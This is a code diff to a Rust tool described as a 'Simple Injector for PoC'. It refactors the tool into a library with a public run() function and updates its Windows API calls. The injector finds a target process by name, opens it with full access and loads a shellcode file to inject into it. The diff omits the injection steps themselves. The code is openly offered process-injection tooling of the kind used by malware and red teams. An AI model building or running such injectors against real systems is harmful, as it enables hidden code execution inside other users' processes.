@@ -16,9 +16,9 @@ use windows_sys::Win32::{
 };
 
 /// Simple Injector for PoC
-#[derive(Parser, Debug)]
+#[derive(Parser, Debug, Clone)]
 #[command(author, version, about, long_about = None)]
-struct Args {
+pub struct Args {
     /// The target process name (notepad.exe)
     #[arg(long)]
     process: String,
@@ -28,22 +28,16 @@ struct Args {
     file: String,
 }
 
-fn main() {
-    let args = Args::parse();
-
-    let process_name = &args.process;
-    let file_path = args.file;
-
-    let process_id =
-        get_process_id_by_name(process_name).expect("Failed to get process ID by name");
+pub fn run(Args { ref process, file }: Args) {
+    let process_id = get_process_id_by_name(process).expect("Failed to get process ID by name");
     println!("[+] Process ID: {}", process_id);
 
-    let shellcode_bytes = std::fs::read(file_path).expect("Failed to read path to PIC shellcode");
+    let shellcode_bytes = std::fs::read(file).expect("Failed to read path to PIC shellcode");
 
     // Get a handle to the target process with PROCESS_ALL_ACCESS
     let process_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, process_id) };
 
-    if process_handle == 0 {
+    if process_handle == std::ptr::null_mut() {
         panic!("Failed to open a handle to the target process");
     }
 
@@ -108,7 +102,7 @@ fn main() {
 }
 
 /// Gets the process ID by name, take process name as a parameter
-fn get_process_id_by_name(process_name: &str) -> Result<u32, String> {
+pub fn get_process_id_by_name(process_name: &str) -> Result<u32, String> {
     let h_snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
 
     if h_snapshot == INVALID_HANDLE_VALUE {
@@ -123,7 +117,10 @@ fn get_process_id_by_name(process_name: &str) -> Result<u32, String> {
     }
 
     loop {
-        if convert_c_array_to_rust_string(process_entry.szExeFile.to_vec()).to_lowercase()
+        if convert_c_array_to_rust_string(
+            unsafe { &*(process_entry.szExeFile.as_slice() as *const _ as *const [u8]) }.to_vec(),
+        )
+        .to_lowercase()
             == process_name.to_lowercase()
         {
             break;
@@ -151,7 +148,7 @@ pub fn convert_c_array_to_rust_string(buffer: Vec<u8>) -> String {
 
 #[allow(dead_code)]
 /// Gets user input from the terminal
-fn get_input() -> std::io::Result<()> {
+pub fn get_input() -> std::io::Result<()> {
     let mut buf = String::new();
     std::io::stdin().read_line(&mut buf)?;
     Ok(())
